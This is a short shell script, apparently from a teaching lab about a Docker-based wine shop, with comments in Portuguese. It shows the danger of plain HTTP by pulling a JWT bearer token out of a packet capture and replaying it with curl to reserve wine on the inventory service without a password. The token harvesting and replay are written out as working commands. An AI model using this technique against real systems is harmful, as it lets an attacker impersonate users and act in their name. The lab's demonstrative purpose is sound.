#!/bin/sh
# Mostra o risco do HTTP sem criptografia: pega o JWT que aparece em capturas/http.pcap
# e usa esse token, a partir da máquina cliente, para reservar vinho direto no Estoque.
cd "$(dirname "$0")/.."
TOKEN=$(strings capturas/http.pcap | grep -m1 -o 'Bearer [A-Za-z0-9._-]*' | cut -d' ' -f2)
echo "Token encontrado na captura: $(echo "$TOKEN" | cut -c1-50)..."
echo "Usando o token capturado para reservar 5 garrafas sem saber a senha:"
docker exec vinheria-cliente curl -s -X POST http://estoque.vinheria.local:8080/estoque/vinhos/1/reserva \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"quantidade":5}'
echo
